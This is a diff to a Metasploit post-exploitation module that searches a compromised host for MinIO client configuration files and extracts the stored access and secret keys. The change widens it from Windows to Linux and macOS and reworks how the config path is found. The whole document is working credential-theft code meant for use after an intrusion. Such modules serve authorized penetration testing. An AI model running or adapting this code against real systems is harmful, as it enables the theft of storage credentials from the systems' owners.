@@ -1,20 +1,15 @@
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
-#
-# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
-# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
 ##
 
 class MetasploitModule < Msf::Post
-  include Msf::Post::Windows::Registry
-  include Msf::Post::Windows::UserProfiles
-
+  include Msf::Post::File
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Windows Gather MinIO Client Key',
+        'Name' => 'Gather MinIO Client Key',
         'Description' => %q{
           This is a module that searches for MinIO Client credentials on a windows remote host.
         },
@@ -23,7 +18,7 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'https://blog.kali-team.cn/Metasploit-MinIO-Client-7d940c60ae8545aeaa29c96536dda855' ]
         ],
         'Author' => ['Kali-Team <kali-team[at]qq.com>'],
-        'Platform' => [ 'win' ],
+        'Platform' => [ 'win', 'linux', 'osx' ],
         'SessionTypes' => %w[meterpreter powershell shell],
         'Notes' => {
           'Stability' => [],
@@ -59,8 +54,10 @@ class MetasploitModule < Msf::Post
           some_result = configuration['aliases']
         end
       rescue JSON::ParserError => e
-        elog('Unable to parse configuration', error: e)
+        print_error("Unable to parse configuration:#{e}")
       end
+    else
+      print_error("Configuration file not found:#{config_path}")
     end
     return some_result
   end
@@ -78,11 +75,10 @@ class MetasploitModule < Msf::Post
       'Header' => 'MinIO Client Key',
       'Columns' => columns
     )
-    all_result.each do |results|
-      results.each do |name, item|
-        row = [name, item['url'], item['accessKey'], item['secretKey'], item['api'], item['path']]
-        tbl << row
-      end
+
+    all_result.each do |name, item|
+      row = [name, item['url'], item['accessKey'], item['secretKey'], item['api'], item['path']]
+      tbl << row
     end
 
     print_line(tbl.to_s)
@@ -92,19 +88,34 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def get_config_file_path
+    case session.platform
+    when 'windows'
+      home = session.sys.config.getenv('USERPROFILE')
+      return if home.nil?
+
+      config_path = home + '\\mc\\config.json'
+      return config_path
+    when 'linux', 'osx'
+      home = session.sys.config.getenv('HOME')
+      return if home.nil?
+
+      config_path = home + '/.mc/config.json'
+      return config_path
+    end
+  end
+
   def run
     # used to grab files for each user on the remote host
-    all_result = []
     config_path = datastore['CONFIG_PATH'] || ''
+    result = Hash.new
     if config_path.empty?
-      grab_user_profiles.each do |user_profiles|
-        next if user_profiles['ProfileDir'].nil?
-
-        all_result << parser_minio(user_profiles['ProfileDir'] + '\\mc\\config.json')
-      end
+      result = parser_minio(get_config_file_path)
     else
-      all_result << parser_minio(config_path)
+      result = parser_minio(config_path)
     end
-    print_and_save(all_result)
+    return if result.empty?
+
+    print_and_save(result)
   end
 end
